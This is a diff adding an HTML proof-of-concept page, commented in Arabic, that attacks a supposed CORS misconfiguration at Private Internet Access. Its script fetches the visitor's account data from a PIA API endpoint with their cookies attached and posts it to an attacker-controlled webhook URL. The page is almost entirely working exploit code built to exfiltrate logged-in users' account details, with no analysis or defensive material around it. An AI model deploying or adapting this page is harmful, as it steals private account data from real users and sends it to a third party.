@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PIA CORS Exploit - Full Data Exfiltration</title>
+</head>
+<body>
+    <h1>PIA CORS Critical Proof-of-Concept</h1>
+    <p>If you're logged into PIA, your account data will be stolen...</p>
+    <div id="result"></div>
+
+    <script>
+        // === CONFIGURATION ===
+        // استبدل ده برابط webhook.site أو requestbin أو server بتاعك
+        const ATTACKER_SERVER = 'https://webhook.site/YOUR-UNIQUE-URL';
+
+        // الهدف: نقطة API حساسة في PIA
+        const TARGET_URL = 'https://www.privateinternetaccess.com/api/client/v5/account';
+
+        // دالة الإرسال للمخترق
+        function sendToAttacker(data) {
+            fetch(ATTACKER_SERVER, {
+                method: 'POST',
+                mode: 'no-cors', // تجنب مشاكل CORS للخادم الخارجي
+                body: JSON.stringify({
+                    stolen: data,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent
+                }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+        }
+
+        // الهجوم الرئيسي
+        fetch(TARGET_URL, {
+            method: 'GET',
+            credentials: 'include', // يرسل الكوكيز تلقائيًا
+            headers: {
+                'Origin': window.location.origin // أي Origin وهنشوف لو السماح بـ *
+            }
+        })
+        .then(response => response.json())
+        .then(data => {
+            // عرض جزء من البيانات المسروقة كدليل (بدون تسريب كامل)
+            document.getElementById('result').innerHTML = 
+                '<h2 style="color:red;">✅ DATA STOLEN SUCCESSFULLY!</h2>' +
+                '<pre>' + JSON.stringify(data, null, 2).substring(0, 500) + '...</pre>';
+            
+            // إرسال البيانات للخادم
+            sendToAttacker(data);
+            
+            console.log('Exfiltrated:', data);
+        })
+        .catch(error => {
+            document.getElementById('result').innerHTML = 
+                '<p>Error: ' + error.message + '</p>';
+        });
+    </script>
+</body>
+</html>
